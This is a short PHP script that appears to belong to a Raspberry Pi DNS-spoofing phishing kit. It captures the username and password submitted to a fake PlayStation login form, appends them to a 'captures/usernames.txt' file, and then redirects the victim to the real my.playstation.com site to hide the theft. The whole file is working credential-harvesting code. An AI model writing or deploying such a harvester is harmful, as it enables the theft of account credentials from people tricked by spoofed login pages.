<?php

file_put_contents("/root/rpi_gui_map/DNSSpoof/captures/usernames.txt", "Account: " . $_POST['j_username'] . " Pass: " . $_POST['j_password'] . "\n", FILE_APPEND);
header('Location: https://my.playstation.com/');
exit();
